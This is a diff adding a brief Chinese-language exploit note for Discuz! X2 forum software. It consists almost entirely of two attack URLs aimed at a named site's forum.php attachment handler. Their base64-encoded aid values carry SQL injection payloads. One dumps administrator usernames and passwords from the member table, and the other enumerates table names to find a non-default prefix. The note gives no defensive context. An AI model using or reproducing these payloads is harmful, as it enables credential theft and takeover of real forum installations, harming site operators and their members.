@@ -1,0 +1,11 @@
+利用方法:
+
+DZ X2直接暴管理账号密码
+
+http://www.rootnull.com /forum.php?mod=attachment&findpost=ss&aid=MScgYW5kIDE9MiB1bmlvbiBhbGwgc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lLDB4N0MzMjc0NzQ3QyxwYXNzd29yZCkgZnJvbSBwcmVfY29tbW9uX21lbWJlciB3aGVyZSAgdXNlcm5hbWUgbGlrZSAnYWRtaW58eHx5%3D
+
+假如利用不成功说明不是默认前缀,可以用
+
+http://www.rootnull.com /forum.php?mod=attachment&findpost=ss&aid=MScgYW5kIDE9MiB1bmlvbiBhbGwgc2VsZWN0IDEsVEFCTEVfTkFNRSBmcm9tIElORk9STUFUSU9OX1NDSEVNQS5UQUJMRVMgd2hlcmUgVEFCTEVfU0NIRU1BPWRhdGFiYXNlKCkgYW5kICBUQUJMRV9OQU1FIGxpa2UgJyVfbWVtYmVyfHh8eQ%3D
+
+暴前缀 不过一般都没人改.
